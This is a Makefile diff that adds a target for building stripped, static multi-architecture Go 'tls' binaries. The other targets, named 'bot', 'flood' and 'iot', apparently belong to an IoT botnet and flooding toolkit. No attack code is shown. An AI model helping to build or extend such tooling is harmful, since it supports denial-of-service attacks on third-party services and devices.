@@ -2,7 +2,9 @@ CXX      ?= g++
 CXXFLAGS  = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread -static-libstdc++ -static-libgcc
 ZIG       ?= /tmp/zig-linux-x86_64-0.13.0/zig
 
-all: bot flood multiarch
+.PHONY: all multiarch tls iot clean
+
+all: bot flood multiarch tls
 
 bot: bot.cpp
 	@if [ -x "$(ZIG)" ]; then \
@@ -32,7 +34,19 @@ multiarch:
 		echo "[+] Multi-arch static binaries built successfully."; \
 	fi
 
+tls:
+	@if command -v go >/dev/null 2>&1; then \
+		echo "[*] Building multi-arch static TLS binaries with Go..."; \
+		(cd tls && \
+			CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o tls tls.go && \
+			CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o tls-x86_64 tls.go && \
+			CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o tls-aarch64 tls.go && \
+			CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -ldflags="-s -w" -o tls-armv7l tls.go && \
+			CGO_ENABLED=0 GOOS=linux GOARCH=386 go build -ldflags="-s -w" -o tls-x86 tls.go); \
+		echo "[+] Multi-arch TLS binaries built successfully."; \
+	fi
+
 iot: bot flood
 
 clean:
-	rm -f bot flood bot-* flood-* http-* http https
+	rm -f bot flood bot-* flood-* http-* http https tls/tls-*
